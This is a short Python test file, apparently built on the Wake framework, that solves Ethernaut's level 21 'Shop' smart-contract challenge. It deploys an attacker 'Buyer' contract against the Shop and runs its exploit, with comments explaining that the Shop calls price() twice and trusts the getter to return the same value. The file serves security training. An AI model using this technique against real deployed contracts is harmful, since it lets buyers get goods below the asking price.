from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv21_shop import Shop
from pytypes.contracts.attacker.lv21_buyer import Buyer

@default_chain.connect()
def test_lv21():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv21()
    exploit_lv21(contract)
    ethernaut.check_lv21(contract)

def exploit_lv21(contract: Shop):
    # Attack vector: function price is called twice instead of saving its value
    # Training: wrongly assuming that calling method (getter) returns the same value every time

    exploitContract = Buyer.deploy(victimAddress=contract.address)
    exploitContract.exploit()
